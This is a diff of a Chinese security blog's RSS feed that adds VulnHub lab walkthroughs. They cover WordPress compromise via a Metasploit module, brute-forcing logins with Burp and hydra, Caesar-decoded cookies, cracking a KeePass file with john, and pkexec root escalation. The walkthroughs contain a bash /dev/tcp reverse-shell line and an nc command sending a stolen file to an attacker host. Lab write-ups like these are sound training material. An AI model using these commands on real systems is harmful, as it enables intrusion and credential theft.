+&lt;h3 id=&#34;智力游戏解谜2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解谜2&#34;&gt;#&lt;/a&gt; 智力游戏解谜 2&lt;/h3&gt;
+&lt;p&gt;查看 wordpress 首页的源代码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy8=&#34;&gt;http://192.168.31.19/lyricsblog/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-969.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;访问这个网址，得到一个文件: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZy95ZXNtYW4ucG5n&#34;&gt;http://192.168.31.29/lyricsblog/yesman.png&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-970.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;线索到这里就断了，这个图片并没有什么利用价值。但是我们可以肯定的是，线索一定是存在在 wordpres 这个站点上的。接下来我们就手动翻一翻网页，看面有没有什么线索。观察上边的图片，对比在站点上找到的页面，发现了一个巧合点，此图片顶头有个 YES,I ENJOY HAKAN TASIYAN, 网页上有一段标题为 Hakan Taşıyan – Doktor 可能突破点就在于这个点。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-971.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;进到这个页面之后，这里有三段文字&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-972.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;是不是有联系，将不带标题的段落文本复制到文本文件中并保存，计算并检查 MD5 消息摘要&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-973.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在后台处尝试登陆，用户名为 wpscan 破解出来的，密码就用此 md5 数据&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-974.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;登陆失败，将 md5 数据由小写变为大写再次尝试&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cat md5.txt | awk &#39;&amp;#123;print toupper($0)&amp;#125;&#39; &amp;gt;&amp;gt; MD5.txt&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-975.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;再次登陆此网址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy93cC1sb2dpbi5waHA=&#34;&gt;http://192.168.31.19/lyricsblog/wp-login.php&lt;/span&gt;&lt;br&gt;
+ 由密码 BC78C6AB38E114D6135409E44F7CDDA2 成功进入&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-976.png&#34; width=&#34;250&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;后台页面显示如下&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-977.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;msf攻击wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf攻击wordpress&#34;&gt;#&lt;/a&gt; msf 攻击 wordpress&lt;/h3&gt;
+&lt;p&gt;可以搜索 wordpress 相关版本查看相关漏洞，查看版本之后用 msf 反弹 shell&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password BC78C6AB38E114D6135409E44F7CDDA2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username erdalkomurcu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /lyricsblog&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-978.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;options 检查如下参数&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-979.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;run 开始执行 wordpress 的攻击，成功拿到靶机的 webshell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-980.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;meterpreter反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#meterpreter反弹shell&#34;&gt;#&lt;/a&gt; meterpreter 反弹 shell&lt;/h3&gt;
+&lt;p&gt;将 msf 的 shell 反弹出来进行美化便于操作&lt;br&gt;
+ &lt;code&gt;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.75/4445 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;nc -lvvp 4445&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-981.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;keepass-密码破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#keepass-密码破解&#34;&gt;#&lt;/a&gt; keepass 密码破解&lt;/h3&gt;
+&lt;p&gt;翻阅服务器的相关文件，看到 config 配置文件，找到了数据库用户名和密码，并且 /etc/passwd 中是用 raphael 这个用户的  &lt;code&gt;su raphael:_double_trouble_&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-982.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注意到此用户根目录下有一个隐藏文件.chadroot.kdbx,KeePass 是一款免费的开源密码管理器，可帮助您以安全的方式管理您的密码。您可以将所有密码存储在一个数据库中，该数据库由主密钥锁定。因此，您只需记住一个主密钥即可解锁整个数据库。数据库文件使用目前已知的最佳和最安全的加密算法（AES- 256 、ChaCha20 和 Twofish）进行加密。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Keepass 存在漏洞，把其传到 kali 机器上，有多种传输方式&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;scp  &lt;code&gt;scp -P22 parallels@192.168.31.73:/home/parallels/Desktop/tmp/.chadroot.kdbx .&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-983.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;ul&gt;
+&lt;li&gt;nc  &lt;code&gt;nc 192.168.31.73 4446 &amp;lt; .chadroot.kdbx&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-984.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
+&lt;ul&gt;
+&lt;li&gt;wget  &lt;code&gt;python3 -m http.server 8000&lt;/code&gt;   &lt;code&gt;wget 192.168.31.29/.chadroot.kdbx -O 2.kdbx&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-985.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用 keepass2john 将 kdbx 后缀的文件转化为 john 能破解的格式并破解&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;keepass2john .chadroot.kdbx &amp;gt; chadroot&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt chadroot&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-986.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 此处破解的密码应该是：chatter&lt;/p&gt;
+&lt;p&gt;登陆网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcHAua2Vld2ViLmluZm8v&#34;&gt;https://app.keeweb.info/&lt;/span&gt; 输入 chatter 进入&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-987.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到如下界面，每一个页面里边都有一个 root 对应的密码，这四个密码分别是&lt;br&gt;
+ &lt;code&gt;.:.yarak.:.&lt;/code&gt;   &lt;code&gt;sercertservice&lt;/code&gt;   &lt;code&gt;.:.subjective.:.&lt;/code&gt;   &lt;code&gt;rockyou.txt&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-988.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-989.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在服务器里边分别尝试这四个 root 的密码是否正确&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-990.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 输入密码.:.subjective.:. 时成功拿到 root 权限&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/137%20VENUS/</guid>
+            <title>VULNHUB 37 VENUS</title>
+            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/137%20VENUS/</link>
+            <category>VULNHUB 31-40</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtdmVudXMsNzA1Lw==&#34;&gt;https://www.vulnhub.com/entry/the-planets-venus,705/&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 VENUS：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-991.png&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.12 靶机开放端口 22,8080&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI6ODA4MC8=&#34;&gt;http://192.168.31.12:8080/&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-992.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;给出了 guest:guest 的账户和密码，直接进入该网站&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-993.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看了一下，翻了翻源代码没有发现敏感信息&lt;/p&gt;
+&lt;p&gt;用 gobuster 进行爆破:&lt;br&gt;
+ &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12:8080/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-994.png&#34;&gt;
+&lt;p&gt;-&amp;gt; 关键目录 /admin&lt;/p&gt;
+&lt;h3 id=&#34;存储-cookies-泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储-cookies-泄露&#34;&gt;#&lt;/a&gt; 存储 cookies 泄露&lt;/h3&gt;
+&lt;p&gt;进入 admin 页面，检查页面是否存储 cookies 信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-995.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将 auth 认证信息解密出来后发现是 guest:thrfg&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-996.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;意味着我们登陆 guest 用户，页面就会存储 guest 用户的相关票据，但是凭借此用户密码是无法登陆到网站后台的&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-997.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;是不是有可能还有其他的登陆用户，我们将 google 存储在此页面的 cookie 信息清除&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-998.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;重新回到登陆页面&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-999.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 下一步的目标转化为爆破此页面的用户名和密码&lt;/p&gt;
+&lt;h3 id=&#34;burp-爆破登陆框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-爆破登陆框&#34;&gt;#&lt;/a&gt; burp 爆破登陆框&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;但是如果没有什么规律的话， 1000 行大小的字典爆破，需要 1000*1000 次的爆破次数，因为用户名和密码都有可能是这 1000 个种的任意一个&lt;br&gt;
+输入一个错误的用户名看页面回显，看到了 Invalid username 的信息，于是乎我们可以先随便写一个密码，先爆破出用户名有哪些，有的话在依据此用户名爆破其密码&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1000.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;顺便测一下输入正确的用户名，错误的密码的时候，页面的回显结果。发现有 Invalid password 的字段，可以据此信息判断页面是否能登陆成功。&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1001.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;现在我们就通过爆破用户名的方式进入该网站，可以通过 burp 和 hydra 进行爆破。采用 burp 的方式需要先将浏览器数据进行代理。&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1002.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将用户名设置为变量，密码设置为固定值进行爆破，由于默认给出的账户名和密码都是 guest 是一样的，这里我就直接通过将 username 和 password 的字段设置为一致来爆破。&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1003.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;选取合适的字典如下，开始爆破&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1004.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;爆破成功后得到了 venus 用户是该网站的用户。&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1005.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;接下来应该将 venus 作为固定用户名，测试其密码为多少。&lt;/p&gt;
+&lt;h3 id=&#34;hydra-爆破登陆框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破登陆框&#34;&gt;#&lt;/a&gt; hydra 爆破登陆框&lt;/h3&gt;
+&lt;p&gt;或者用 hydra 的方式爆破用户名和密码&lt;br&gt;
+ &lt;code&gt;hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post- form &amp;quot;/:username=^USER^&amp;amp;password^PASS^:Invalid username.&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1006.png&#34;&gt;
+&lt;p&gt;-&amp;gt; 测试得到了三个用户分别是 guest，venus，magellan&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;爆破用户名的阶段是比较漫长的，虽然可以用 hydra 的 - t 参数指定最大线程为 64 ，但是还是需要很长时间才能爆破出三个用户名的，这里为了尽快达到效果，我用了 vim 将字典进行了修改。&lt;br&gt;
+单单依据上面的思路继续下去，需要对三个用户分别进行爆破，guest 和 venus 比较好爆破，经过一段时间的爆破发现这两个用户名的密码就是其用户名。但如果这个密码是比较复杂的也是很难爆破出来的。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;数据包规律&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据包规律&#34;&gt;#&lt;/a&gt; 数据包规律&lt;/h3&gt;
+&lt;p&gt;登陆 guest:guest，拦截浏览器数据，发现页面自动存储了 cookie 的信息。解密之后为 guest:thrfg, 前者是用户名，后者并不是密码，但可能是密码的另一种加密方式。&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1007.png&#34;&gt;
+&lt;p&gt;登陆 venus:venus，拦截浏览器数据，找到 cookie，解密后的凭据为 venus:irahf&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1008.png&#34;&gt;
+&lt;p&gt;我们继续清除浏览器存储的 cookie 信息，用正确的用户名和一个虚假的密码尝试登陆，并用 burp 做代理拦截流量，发现页面给我们回复了一个加密密文。解密后得到了 magellan:irahfvnatrbybtl1989&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1009.png&#34;&gt;
+&lt;p&gt;综上，我们得到了三组数据，分别是&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;guest:thrfg&lt;/code&gt;   &lt;code&gt;venus:irahf&lt;/code&gt;   &lt;code&gt;magellan:irahfvnatrbybtl1989&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;凯撒解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#凯撒解密&#34;&gt;#&lt;/a&gt; 凯撒解密&lt;/h3&gt;
+&lt;p&gt;观察得知，好像就是一个字符的偏移加密，这就是凯撒加密无疑了，但是具体偏移多少位还需要一一尝试，在下面网址中依次按不同的偏移量进行解密:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw&#34;&gt;http://moersima.00cha.net/kaisamima.asp&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1010.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;最终得到了加密方式为凯撒偏移 13 的加密，并且三位用户名密码均得到了。&lt;/p&gt;
+&lt;p&gt;ssh 成功拿到了 magellan 的权限，得到了其 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1011.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;pkexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-提权&#34;&gt;#&lt;/a&gt; pkexec 提权&lt;/h3&gt;
+&lt;p&gt;看了一眼服务器存在 pkexec 的，并且有 s 权限，而且存在 gcc 编译器的，直接利用此进行提权&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1012.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将 pkexec 的利用脚本发送至对方服务器，编译运行&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1013.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/133%20GROTESQUE3/</guid>
             <title>VULNHUB 33 GROTESQUE3</title>
             <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/133%20GROTESQUE3/</link>
@@ -601,6 +691,227 @@ John 1.txt –format=Raw-MD5 –wordlist=/usr/share/wordlists/dirbuster/director
 &lt;p&gt;监听 shell，等待反弹，pspy 监控到执行，同时得到了 root 的 shell&lt;/p&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-892.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;-&amp;gt; 拿到了 root 的权限&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/</guid>
+            <title>VULNHUB 31 PROXIMACENTAURI</title>
+            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/</link>
+            <category>VULNHUB 31-40</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tcHJveGltYWNlbnRhdXJpLDcwOS8=&#34;&gt;https://www.vulnhub.com/entry/hacksudo-proximacentauri,709/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDM0NzYyL2FydGljbGUvZGV0YWlscy8xMTg2NjM1NTE=&#34;&gt;https://blog.csdn.net/qq_45434762/article/details/118663551&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 PROXIMACENTAURI：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-786.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.5&lt;/p&gt;
+&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
+ &lt;code&gt;sudo nmap -A -p- 192.168.31.5&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-787.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 80&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNQ==&#34;&gt;http://192.168.31.5&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-788.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;目录扫描:  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.5&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-789.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找到很多目录，暂时不知道哪个目录比较敏感，需要依次访问&lt;/p&gt;
+&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzLw==&#34;&gt;http://192.168.31.5/docs/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-790.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;看到一个 php 后缀的文件，点开看看:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzL3VwZGF0YS5waHA=&#34;&gt;http://192.168.31.5/docs/updata.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-791.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-792.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9pbWFnZXMv&#34;&gt;http://192.168.31.5/images/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-793.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9sb2dpbi5waHA=&#34;&gt;http://192.168.31.5/login.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-794.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 得到一个后台的登陆地址，并且该 web 是有 pluck 4.7.13 写出来的&lt;/p&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy8=&#34;&gt;http://192.168.31.5/files/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-795.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9hZG1pbi5waHA=&#34;&gt;http://192.168.31.5/admin.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-796.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;管理员的后台地址，会自动跳转到 login 界面&lt;/p&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9yb2JvdHMudHh0&#34;&gt;http://192.168.31.5/robots.txt&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-797.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9wbGFuZXQv&#34;&gt;http://192.168.31.5/planet/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-798.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQv&#34;&gt;http://192.168.31.5/files/planet/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-799.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
